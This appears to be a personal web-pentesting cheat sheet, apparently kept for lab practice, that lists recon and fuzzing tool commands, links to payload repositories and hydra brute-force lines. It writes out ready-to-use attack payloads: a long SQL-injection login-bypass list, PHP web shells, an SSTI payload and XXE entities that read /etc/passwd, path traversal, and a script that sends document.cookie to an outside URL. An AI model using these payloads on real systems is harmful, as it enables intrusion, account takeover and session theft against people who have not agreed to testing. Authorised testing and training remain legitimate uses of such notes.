# Web Hacking

## Resources

https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration  
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html  
https://github.com/EdOverflow/can-i-take-over-xyz#all-entries  
https://highon.coffee/blog/lfi-cheat-sheet/  
https://saadahmedx.medium.com/weaponizing-xss-for-fun-profit-a1414f3fcee9  
https://github.com/swisskyrepo/PayloadsAllTheThings

### Javascript
```
document.getElementById
document.getElementByClassName
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagNameNS

var variablename document.getElementByIdTagName("tagName").innerHTML = "-confirm(1)-"
var variablename document.getElementsByIdTagName("tagName")[0].innerHTML = "-confirm(1)-"

document.getElementById('thm-title').innerHTML = "Insert Code"
document.querySelector('#thm-title').innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')
document.querySelectorAll('#thm-title').length
document.querySelectorAll('#thm-title')[0]
document.querySelectorAll('#thm-title')[0].baseURI
document.querySelectorAll('#thm-title')[0].innerHTML
document.querySelectorAll('#thm-title')[0].innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')[0].innerText
document.querySelectorAll('#thm-title')[0].innerText = "Insert Code"
```

### jQuery 2.1.1
```
$.get('http://example.com/jquerypayload')
$.post('http://example.com/jquerypayload')
$.parseHTML("<img src='​http://example.com/logo_jquery_215x53.gif'>")
$.parseHTML("<img src='z' onerror='alert(\"xss\")'>")

jquerypayload
alert(document.domain);
```

### Creating Requests
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'URL' + document.cookie, true);
xhttp.send();
```

Thanks to @Legacyy for assisting me with the javascript breakdown

### XSS
Resources:

https://joecmarshall.com/posts/burp-suite-extensions-xss-validator/

https://portswigger.net/support/xss-beating-html-sanitizing-filters

https://xsshunter.com/app

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### XSS Payloads
https://github.com/payloadbox/xss-payload-list

https://github.com/pgaijin66/XSS-Payloads


## Port scanning web server
```
nmap -sC -sV -v -p- IP
nmap -sC -sV -v -p- IP --min-rate=10000
```

## Fuzzing Websites
https://github.com/ffuf/ffuf

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302

To filter by size
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302 -fs 1000

ffuf -u http://example.com/FUZZ -e asp,html,jpg -recursion -recursion-depth 2 -w wordlist.txt
```
### Fuzzing Resources
https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt

## Subdomain Scraping
https://github.com/OWASP/Amass
```
amass enum -v -src -ip -brute -min-for-recursive 2 -o domain_list.txt -d $domain
```

### Cleaning domain list (thanks to @dee-see) for assisting on this!
```
awk '{print $2}' $1
```

### Probing domains
https://github.com/tomnomnom/httprobe
```
cat domain_list | httprobe > http_domain_list
```

### Screenshots
https://github.com/FortyNorthSecurity/EyeWitness
```
python3 /path/to/EyeWitness.py -f $1
```

### Web Crawling
https://github.com/jaeles-project/gospider

https://github.com/hakluke/hakrawler

```
gospider -S domain_list.txt --depth 2 --no-redirect -t 50 -c 3 -o gospiderdump
```

### Fuzzing Params
https://github.com/s0md3v/Arjun

https://github.com/maK-/parameth

```
arjun.py -u $url -t 10 --get --post
```

### Domain History
https://github.com/tomnomnom/waybackurls

### findings new domains using amass
https://danielmiessler.com/study/amass/

```
amass intel -ip -cidr $1
```

### capturing basic auth
```
1. sudo msfdb run
2. use auxiliary/server/capture/http_basic
3. set URIPATH abc
4. run
```

### Python secured webserver
```
https://support.microfocus.com/kb/doc.php?id=7013103

openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl


httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443),
        SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="/path/to/key.pem",
        certfile='/path/to/cert.pem', server_side=True)

httpd.serve_forever()
```

### lfi
https://github.com/p0cl4bs/kadimus  
https://github.com/mzfr/liffy  

### sqli
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
```
Auth bypass
'or''='
account’-- -
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
'ad'||'min'
```

### Bruteforcing
https://github.com/frizb/Hydra-Cheatsheet  
```
hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l admin -P rockyou.txt -t -s 443 -f <IP> http-get /
hydra -l <USERID> -P rockyou.txt <IP> -s <PORT> http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
Example: Basic auth for tomcat
hydra -l tomcat -P passfile.txt -t -s 443 -f <IP> http-get /manager/html -s 8080
```

### php payloads
```
<?php echo system($_REQUEST ["cmd"]); ?>
<?php system($_GET['cmd']);?>
```

### param tampers
```
query?param=/legit/path/to/file.php/../../../../etc/passwd
```

### curl fiddling
```
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
```

### hashcat example hashes
https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m <mode> -a 0 hashlist.txt /root/wordlist/rockyou.txt
```

### data wrappers
```
data:text/plain,This is a test
data:test/plain,<?php echo shell_exec("whoami") ?>
```
### resources
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-password-recovery-functionalities/  

### Pen Testing Password Resets
https://0xayub.gitbook.io/blog/

### file upload bypass
https://book.hacktricks.xyz/pentesting-web/file-upload

### php code
```
system($_REQUEST['key']);
```
### LateX injection
https://0day.work/hacking-with-latex/  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  

### Server Sided Template Injection
```
{% import os %}{{ os.popen("cat /etc/passwd").read() }}
```
https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf

### Python Pickling
https://medium.com/@shibinbshaji007/using-pythons-pickling-to-explain-insecure-deserialization-5837d2328466  
https://www.youtube.com/watch?v=HsZWFMKsM08  
```
import pickle

variable = { "test" : "Test2" , "Test3" : "Test4" }

pickle.dumps(variable)
"(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns."

pickle.loads("(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns.")
{'test': 'Test2', 'Test3': 'Test4'}
```

### java deserialization
https://portswigger.net/web-security/deserialization

### XXE
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<fieldname><productId>&xxe;</productId></fieldname>

--------------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root>
<field1>
</field1>
<field2>
</field2>
<field3>
&xxe;
</field3>
</root>
```

### xss via file upload
https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2
